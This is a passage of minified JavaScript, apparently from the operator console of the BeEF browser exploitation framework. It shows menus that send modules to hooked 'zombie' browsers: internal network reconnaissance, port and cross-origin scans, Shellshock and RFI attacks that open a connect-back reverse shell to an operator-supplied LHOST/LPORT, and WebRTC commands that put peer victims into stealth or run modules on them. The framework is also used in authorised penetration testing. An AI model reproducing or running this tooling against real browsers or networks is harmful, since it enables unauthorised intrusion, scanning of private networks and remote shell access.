Date(1e3*e).toUTCString())}}],listeners:{rowclick:function(e,t){e.getStore().getAt(t).data},contextmenu:function(e){e.preventDefault()},containercontextmenu:function(r,i){i.preventDefault(),new Ext.menu.Menu({items:[{text:"Get Internal IP Address",iconCls:"network-host-ctxMenu-adapter",handler:function(){var r=o("get_internal_ip_webrtc");t.update_sending("Identifying zombie network adapters ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"Discover Proxies",iconCls:"network-host-ctxMenu-proxy",handler:function(){var r=o("get_proxy_servers_wpad");t.update_sending("Scanning for WPAD proxies ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"Discover Routers",iconCls:"network-host-ctxMenu-router",handler:function(){var r=o("fingerprint_routers");t.update_sending("Scanning commonly used local area network IP addresses for routers ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"Discover Web Servers",iconCls:"network-host-ctxMenu-web",menu:{xtype:"menu",items:[{text:"Common LAN IPs",iconCls:"network-host-ctxMenu-network",handler:function(){var r="get_http_servers",i=o(r),a=prompt("Enter ports to scan:","80,8080");a?(t.update_sending("Favicon scanning commonly used local area network IP addresses for web servers [ports: "+a+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({rhosts:"common",ports:a}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+i+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+r+" [id: "+i+"]")}})):t.update_fail("Cancelled")}},{text:"Specify IP Range",iconCls:"network-host-ctxMenu-config",handler:function(){var r=prompt("Enter IPs to scan:","192.168.1.1-192.168.1.254");if(r){var i=prompt("Enter ports to scan:","80,8080");if(i){var a="get_http_servers",s=o(a);t.update_sending("Favicon scanning "+r+" for web servers..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({rhosts:r,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+s+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+a+" [id: "+s+"]")}})}else t.update_fail("Cancelled")}else t.update_fail("Cancelled")}}]}},{text:"Fingerprint HTTP",iconCls:"network-host-ctxMenu-fingerprint",menu:{xtype:"menu",items:[{text:"Common LAN IPs",iconCls:"network-host-ctxMenu-network",handler:function(){var r="internal_network_fingerprinting",i=o(r);t.update_sending("Fingerprinting commonly used local area network IP addresses..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:"common"}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+i+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+r+" [id: "+i+"]")}})}},{text:"Specify IP Range",iconCls:"network-host-ctxMenu-config",handler:function(){var r=prompt("Enter IP range to scan:","192.168.1.1-192.168.1.254");if(r){var i="internal_network_fingerprinting",a=o(i);t.update_sending("Fingerprinting "+r+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:r}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+a+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+i+" [id: "+a+"]")}})}else t.update_fail("Cancelled")}}]}},{text:"CORS Scan",iconCls:"network-host-ctxMenu-cors",menu:{xtype:"menu",items:[{text:"Common LAN IPs",iconCls:"network-host-ctxMenu-network",handler:function(){var r="cross_origin_scanner_cors",i=o(r),a=prompt("Enter ports to scan:","80,8080");a?(t.update_sending("CORS scanning commonly used local area network IP addresses [ports: "+a+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:"common",ports:a}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+i+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+r+" [id: "+i+"]")}})):t.update_fail("Cancelled")}},{text:"Specify IP Range",iconCls:"network-host-ctxMenu-config",handler:function(){var r=prompt("Enter IP range to scan:","192.168.1.1-192.168.1.254");if(r){var i=prompt("Enter ports to scan:","80,8080");if(i){var a="cross_origin_scanner_cors",s=o(a);t.update_sending("CORS scanning "+r+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:r,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+s+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+a+" [id: "+s+"]")}})}else t.update_fail("Cancelled")}else t.update_fail("Cancelled")}}]}},{text:"Flash Cross-Origin Scan",iconCls:"network-host-ctxMenu-flash",menu:{xtype:"menu",items:[{text:"Common LAN IPs",iconCls:"network-host-ctxMenu-network",handler:function(){var r="cross_origin_scanner_flash",i=o(r),a=prompt("Enter ports to scan:","80,8080");a?(t.update_sending("Flash cross-origin scanning commonly used local area network IP addresses [ports: "+a+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:"common",ports:a}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+i+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+r+" [id: "+i+"]")}})):t.update_fail("Cancelled")}},{text:"Specify IP Range",iconCls:"network-host-ctxMenu-config",handler:function(){var r=prompt("Enter IP range to scan:","192.168.1.1-192.168.1.254");if(r){var i=prompt("Enter ports to scan:","80,8080");if(i){var a="cross_origin_scanner_flash",s=o(a);t.update_sending("Flash cross-origin scanning "+r+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:r,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+s+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error executing module "+a+" [id: "+s+"]")}})}else t.update_fail("Cancelled")}else t.update_fail("Cancelled")}}]}}]}).showAt(i.getXY())},rowcontextmenu:function(r,i,a){a.preventDefault(),r.getSelectionModel().selectRow(i),r.rowCtxMenu&&r.rowCtxMenu.destroy();var s=r.selModel.getSelected(),l=s.get("ip"),d=l.split(".")[0]+"."+l.split(".")[1]+"."+l.split(".")[2],c=d+".1-"+d+".255";r.rowCtxMenu="127.0.0"==d?new Ext.menu.Menu({items:[{text:"Discover Web Servers",iconCls:"network-host-ctxMenu-web",handler:function(){var r=o("get_http_servers"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("Favicon scanning "+l+" for HTTP servers [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({rhosts:l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}},{text:"Fingerprint HTTP",iconCls:"network-host-ctxMenu-fingerprint",handler:function(){var r=o("internal_network_fingerprinting");t.update_sending("Fingerprinting "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"CORS Scan",iconCls:"network-host-ctxMenu-cors",handler:function(){var r=o("cross_origin_scanner_cors"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("CORS scanning "+l+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}},{text:"Flash Cross-Origin Scan",iconCls:"network-host-ctxMenu-flash",handler:function(){var r=o("cross_origin_scanner_flash"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("Flash cross-origin scanning "+l+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}},{text:"Port Scan",iconCls:"network-host-ctxMenu-network",menu:{xtype:"menu",items:[{text:"Common Ports",iconCls:"network-host-ctxMenu-host",handler:function(){var r=o("port_scanner"),i="21,22,23,25,80,81,443,445,1080,8080,8081,8090,8443,3000,3128,3389,3306,5432,6379,10000,10443";t.update_sending("Port scanning "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipHost:l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"Specify Ports",iconCls:"network-host-ctxMenu-config",handler:function(){var r=o("port_scanner"),i=prompt("Enter ports to scan:","1,5,7,9,15,20,21,22,23,25,26,29,33,37,42,43,53,67,68,69,70,76,79,80,88,90,98,101,106,109,110,111,113,114,115,118,119,123,129,132,133,135,136,137,138,139,143,144,156,158,161,162,168,174,177,194,197,209,213,217,219,220,223,264,315,316,346,353,389,413,414,415,416,440,443,444,445,453,454,456,457,458,462,464,465,466,480,486,497,500,501,516,518,522,523,524,525,526,533,535,538,540,541,542,543,544,545,546,547,556,557,560,561,563,564,625,626,631,636,637,660,664,666,683,740,741,742,744,747,748,749,750,751,752,753,754,758,760,761,762,763,764,765,767,771,773,774,775,776,780,781,782,783,786,787,799,800,801,808,871,873,888,898,901,953,989,990,992,993,994,995,996,997,998,999,1000,1002,1008,1023,1024,1080,8080,8443,8050,3306,5432,1521,1433,3389,10088");i?(t.update_sending("Port scanning "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipHost:l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}}]}}]}):new Ext.menu.Menu({items:[{text:"Discover Web Servers",iconCls:"network-host-ctxMenu-web",menu:{xtype:"menu",items:[{text:"Host ("+l+")",iconCls:"network-host-ctxMenu-host",handler:function(){var r=o("get_http_servers"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("Favicon scanning "+l+" for HTTP servers [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({rhosts:l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}},{text:"Network ("+d+".0/24)",iconCls:"network-host-ctxMenu-network",handler:function(){var r=prompt("Enter ports to scan:","80,8080");if(r){var i=o("get_http_servers");t.update_sending("Favicon scanning "+c+" for HTTP servers [ports: "+r+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({rhosts:c,ports:r}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+i+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}else t.update_fail("Cancelled")}}]}},{text:"Fingerprint HTTP",iconCls:"network-host-ctxMenu-fingerprint",menu:{xtype:"menu",items:[{text:"Host ("+l+")",iconCls:"network-host-ctxMenu-host",handler:function(){var r=o("internal_network_fingerprinting");t.update_sending("Fingerprinting "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"Network ("+d+".0/24)",iconCls:"network-host-ctxMenu-network",handler:function(){var r=o("internal_network_fingerprinting");t.update_sending("Fingerprinting "+c+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:c}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}}]}},{text:"CORS Scan",iconCls:"network-host-ctxMenu-cors",menu:{xtype:"menu",items:[{text:"Host ("+l+")",iconCls:"network-host-ctxMenu-host",handler:function(){var r=o("cross_origin_scanner_cors"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("CORS scanning "+l+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}},{text:"Network ("+d+".0/24)",iconCls:"network-host-ctxMenu-network",handler:function(){var r=o("cross_origin_scanner_cors"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("CORS scanning "+c+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:c,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}}]}},{text:"Flash Cross-Origin Scan",iconCls:"network-host-ctxMenu-flash",menu:{xtype:"menu",items:[{text:"Host ("+l+")",iconCls:"network-host-ctxMenu-host",handler:function(){var r=o("cross_origin_scanner_flash"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("Flash cross-origin scanning "+l+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}},{text:"Network ("+d+".0/24)",iconCls:"network-host-ctxMenu-network",handler:function(){var r=o("cross_origin_scanner_flash"),i=prompt("Enter ports to scan:","80,8080");i?(t.update_sending("Flash cross-origin scanning "+c+" [ports: "+i+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:c,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}}]}},{text:"Port Scan",iconCls:"network-host-ctxMenu-network",menu:{xtype:"menu",items:[{text:"Common Ports",iconCls:"network-host-ctxMenu-host",handler:function(){var r=o("port_scanner"),i="21,22,23,25,80,81,443,445,1080,8080,8081,8090,8443,3000,3128,3389,3306,5432,6379,10000,10443";t.update_sending("Port scanning "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipHost:l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"Specify Ports",iconCls:"network-host-ctxMenu-config",handler:function(){var r=o("port_scanner"),i=prompt("Enter ports to scan:","1,5,7,9,15,20,21,22,23,25,26,29,33,37,42,43,53,67,68,69,70,76,79,80,88,90,98,101,106,109,110,111,113,114,115,118,119,123,129,132,133,135,136,137,138,139,143,144,156,158,161,162,168,174,177,194,197,209,213,217,219,220,223,264,315,316,346,353,389,413,414,415,416,440,443,444,445,453,454,456,457,458,462,464,465,466,480,486,497,500,501,516,518,522,523,524,525,526,533,535,538,540,541,542,543,544,545,546,547,556,557,560,561,563,564,625,626,631,636,637,660,664,666,683,740,741,742,744,747,748,749,750,751,752,753,754,758,760,761,762,763,764,765,767,771,773,774,775,776,780,781,782,783,786,787,799,800,801,808,871,873,888,898,901,953,989,990,992,993,994,995,996,997,998,999,1000,1002,1008,1023,1024,1080,8080,8443,8050,3306,5432,1521,1433,3389,10088");i?(t.update_sending("Port scanning "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipHost:l,ports:i}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}}]}},{xtype:"menuseparator"},{text:"Remove",iconCls:"zombie-tree-ctxMenu-delete",handler:function(){var o=s.get("id");confirm("Are you sure you want to remove network host [id: "+o+", ip: "+l+"] ?")?(t.update_sending("Removing network host [id: "+o+", ip: "+l+"] ..."),jQuery.ajax({contentType:"application/json",dataType:"json",type:"DELETE",url:"/api/network/host/"+o+"?token="+n,async:!1,processData:!1,success:function(n){try{n.success?(t.update_sent("Removed network host successfully"),Ext.getCmp("network-host-grid-zombie-"+e.session).getStore().reload()):t.update_fail("Could not remove network host")}catch(a){t.update_fail("Could not remove network host")}},error:function(){t.update_fail("Could not remove host")}})):t.update_fail("Cancelled")}}]}),r.rowCtxMenu.showAt(a.getXY())},afterrender:function(e){e.store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}}),u=new Ext.Panel({id:"network-host-panel-zombie-"+e.session,title:"Hosts",items:[c],layout:"fit",listeners:{activate:function(e){e.items.items[0].store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}}),p=new Ext.ux.data.PagingJsonStore({storeId:"network-services-store-zombie-"+e.session,proxy:new Ext.data.HttpProxy({url:"/api/network/services/"+e.session+"?token="+n,method:"GET"}),remoteSort:!1,autoDestroy:!0,autoLoad:!1,root:"services",fields:["id","proto","ip","port","type"],sortInfo:{field:"ip",direction:"ASC"}}),f=new Ext.PagingToolbar({pageSize:l,store:p,displayInfo:!0,displayMsg:"Displaying network services {0} - {1} of {2}",emptyMsg:"No services to display"}),h=new Ext.grid.GridPanel({id:"network-services-grid-zombie-"+e.session,store:p,bbar:f,border:!1,loadMask:{msg:"Loading network services..."},viewConfig:{forceFit:!0},view:new Ext.grid.GridView({forceFit:!0,emptyText:"No services",enableRowBody:!0}),columns:[{header:"Id",width:5,sortable:!0,dataIndex:"id",hidden:!0},{header:"IP Address",width:10,sortable:!0,dataIndex:"ip",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Port",width:5,sortable:!0,dataIndex:"port",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Protocol",width:5,sortable:!0,dataIndex:"proto",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Type",width:20,sortable:!0,dataIndex:"type",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}}],listeners:{rowclick:function(e,t){e.getStore().getAt(t).data},containercontextmenu:function(e,t){t.preventDefault()},contextmenu:function(e){e.preventDefault()},rowcontextmenu:function(r,i,a){a.preventDefault(),r.getSelectionModel().selectRow(i),r.rowCtxMenu&&r.rowCtxMenu.destroy();var s=r.selModel.getSelected(),l=s.get("ip"),d=s.get("port"),c=s.get("proto");r.rowCtxMenu=new Ext.menu.Menu({items:[{text:"Fingerprint HTTP",iconCls:"network-host-ctxMenu-fingerprint",handler:function(){var r=o("internal_network_fingerprinting");t.update_sending("Fingerprinting "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l,ports:d}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"CORS Scan",iconCls:"network-host-ctxMenu-cors",handler:function(){var r=o("cross_origin_scanner_cors");t.update_sending("CORS scanning "+l+" [port: "+d+"] ..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({ipRange:l+"-"+l,ports:d}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})}},{text:"Shellshock Scan",iconCls:"network-host-ctxMenu-shellshock",handler:function(){var r=o("shell_shock_scanner"),i=prompt("Enter local IP for connect back shell:","LHOST");if(i&&"LHOST"!=i){var a=prompt("Enter local port for connect back shell:","LPORT");a&&"LPORT"!=a?(alert("Now start your reverse shell handler on "+i+":"+a),t.update_sending("Shellshock scanning "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({rproto:c,rhost:l,rport:d,lhost:i,lport:a}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}else t.update_fail("Cancelled")}},{text:"RFI Scan",iconCls:"network-host-ctxMenu-php",handler:function(){var r=o("rfi_scanner"),i=prompt("Enter local IP for connect back shell:","LHOST");if(i&&"LHOST"!=i){var a=prompt("Enter local port for connect back shell:","LPORT");a&&"LPORT"!=a?(alert("Now start your reverse shell handler on "+i+":"+a),t.update_sending("Shellshock scanning "+l+"..."),jQuery.ajax({contentType:"application/json",data:JSON.stringify({rproto:c,rhost:l,rport:d,lhost:i,lport:a,payload:"reverse_php"}),dataType:"json",type:"POST",url:"/api/modules/"+e.session+"/"+r+"?token="+n,async:!1,processData:!1,success:function(e){t.update_sent("Command [id: "+e.command_id+"] sent successfully")},error:function(){t.update_fail("Error sending command")}})):t.update_fail("Cancelled")}else t.update_fail("Cancelled")}}]}),r.rowCtxMenu.showAt(a.getXY())},afterrender:function(e){e.store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}}),m=new Ext.Panel({id:"network-services-panel-zombie-"+e.session,title:"Services",items:[h],layout:"fit",listeners:{activate:function(e){e.items.items[0].store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}});ZombieTab_Network.superclass.constructor.call(this,{id:"zombie-network-tab-zombie-"+e.session,title:"Network",activeTab:0,viewConfig:{forceFit:!0,stripRows:!0,type:"fit"},items:[a,u,m],bbar:t,listeners:{}})},Ext.extend(ZombieTab_Network,Ext.TabPanel,{}),ZombieTab_Rtc=function(e){var t=beefwui.get_hb_id(e.session),n=new Beef_StatusBar("webrtc-bbar-zombie-"+e.session),o=beefwui.get_rest_token(),r=new Ext.ux.data.PagingJsonStore({storeId:"rtc-events-store-zombie-"+e.session,proxy:new Ext.data.HttpProxy({url:"/api/webrtc/events/"+t+"?token="+o,method:"GET"}),remoteSort:!1,autoDestroy:!0,autoLoad:!1,root:"events",fields:["id","hb_id","target_id","status","created_at","updated_at"],sortInfo:{field:"id",direction:"ASC"}}),i=50,a=new Ext.PagingToolbar({pageSize:i,store:r,displayInfo:!0,displayMsg:"Displaying RTC events {0} - {1} of {2}",emptyMsg:"No events to display"}),s=new Ext.grid.GridPanel({id:"rtc-events-grid-zombie-"+e.session,store:r,bbar:a,border:!1,loadMask:{msg:"Loading events..."},viewConfig:{forceFit:!0},view:new Ext.grid.GridView({forceFit:!0,emptyText:"No events",enableRowBody:!0}),columns:[{header:"Id",width:5,sortable:!0,dataIndex:"id",hidden:!0},{header:"From",width:10,sortable:!0,dataIndex:"hb_id",hidden:!0},{header:"Peer",width:10,sortable:!0,dataIndex:"target_id",renderer:function(e){return e===t?$jEncoder.encoder.encodeForHTML(e)+" (selected)":$jEncoder.encoder.encodeForHTML(e)+" ("+beefwui.get_info_from_id(e).ip+")"}},{header:"Status",width:20,sortable:!0,dataIndex:"status",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Created At",width:10,sortable:!0,dataIndex:"created_at",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Updated At",width:10,sortable:!0,dataIndex:"updated_at",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}}],listeners:{contextmenu:function(e){e.preventDefault()},containercontextmenu:function(e,t){t.preventDefault()},rowcontextmenu:function(e,o,r){r.preventDefault(),e.getSelectionModel().selectRow(o),e.rowCtxMenu&&e.rowCtxMenu.destroy();var i=e.selModel.getSelected();"Connected"===i.json.status?(e.rowCtxMenu=new Ext.menu.Menu({items:[{text:"Command Peer to Stealth",handler:function(){if(t===i.json.hb_id)var e=i.json.hb_id,o=i.json.target_id;else e=i.json.target_id,o=i.json.hb_id;n.update_sending("Sending stealth command");var r="/api/webrtc/msg?token="+beefwui.get_rest_token();Ext.Ajax.request({url:r,method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{from:e,to:o,message:"!gostealth"},success:function(){n.update_sent("Stealth command sent successfully")},error:function(){n.update_fail("Error sending stealth command")}})}},{text:"Execute Command Module via RTC",handler:function(){var e="/api/webrtc/cmdexec?token="+beefwui.get_rest_token(),o=prompt("Enter command module ID:");if(o&&""!=o&&!isNaN(o)){var a=prompt("Parameters:");""==a&&(a="[]");try{a=JSON.parse(a)}catch(r){return void n.update_fail("Invalid JSON")}if(t===i.json.hb_id)var s=i.json.hb_id,l=i.json.target_id;else s=i.json.target_id,l=i.json.hb_id;n.update_sending("Sending command [id: "+o+"]"),Ext.Ajax.request({url:e,method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{from:s,to:l,cmdid:o,options:a},success:function(){n.update_sent("Command [id: "+o+"] sent successfully")},error:function(){n.update_fail("Error executing module [id: "+o+"]")}})}else n.update_fail("Invalid command module ID")}}]}),e.rowCtxMenu.showAt(r.getXY())):"Stealthed!!"===i.json.status&&(e.rowCtxMenu=new Ext.menu.Menu({items:[{text:"Command Peer to un-stealth",handler:function(){if(t===i.json.hb_id){n.update_sending("Sending un-stealth command");var e="/api/webrtc/msg?token="+beefwui.get_rest_token();Ext.Ajax.request({url:e,method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{from:i.json.hb_id,to:i.json.target_id,message:"!endstealth"},success:function(){n.update_sent("Un-stealth command sent successfully")},error:function(){n.update_fail("Error sending un-stealth command")}})}}},{text:"Execute Command Module via RTC",handler:function(){var e="/api/webrtc/cmdexec?token="+beefwui.get_rest_token(),t=prompt("Enter command module ID:");if(t&&""!=t&&!isNaN(t)){var o=prompt("Parameters:");""==o&&(o="[]");try{o=JSON.parse(o)}catch(r){return void n.update_fail("Invalid JSON")}n.update_sending("Sending command [id: "+t+"]"),Ext.Ajax.request({url:e,method:"POST",headers:{"Content-Type":"application/json; charset=UTF-8"},jsonData:{from:i.json.hb_id,to:i.json.target_id,cmdid:t,options:o},success:function(){n.update_sent("Command [id: "+t+"] sent successfully")},error:function(){n.update_fail("Error executing module [id: "+t+"]")}})}else n.update_fail("Invalid command module ID")}}]}),e.rowCtxMenu.showAt(r.getXY()))},afterrender:function(e){e.store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}}),l=new Ext.Panel({id:"rtc-events-host-panel-zombie-"+e.session,title:"Peers",items:[s],layout:"fit",listeners:{activate:function(){l.items.items[0].store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}}),d=new Ext.ux.data.PagingJsonStore({storeId:"rtc-moduleevents-store-zombie-"+e.session,proxy:new Ext.data.HttpProxy({url:"/api/webrtc/cmdevents/"+t+"?token="+o,method:"GET"}),remoteSort:!1,autoDestroy:!0,autoLoad:!1,root:"events",fields:["id","hb_id","target_id","status","created_at","updated_at","mod"],sortInfo:{field:"id",direction:"ASC"}}),c=new Ext.PagingToolbar({pageSize:i,store:d,displayInfo:!0,displayMsg:"Displaying RTC command events {0} - {1} of {2}",emptyMsg:"No events to display"}),u=new Ext.grid.GridPanel({id:"rtc-moduleevents-grid-zombie-"+e.session,store:d,bbar:c,border:!1,loadMask:{msg:"Loading events..."},viewConfig:{forceFit:!0},view:new Ext.grid.GridView({forceFit:!0,emptyText:"No events",enableRowBody:!0}),columns:[{header:"Id",width:5,sortable:!0,dataIndex:"id",hidden:!0},{header:"From",width:10,sortable:!0,dataIndex:"hb_id",hidden:!0},{header:"Peer",width:10,sortable:!0,dataIndex:"target_id",renderer:function(e){return e===t?$jEncoder.encoder.encodeForHTML(e)+" (selected)":$jEncoder.encoder.encodeForHTML(e)+" 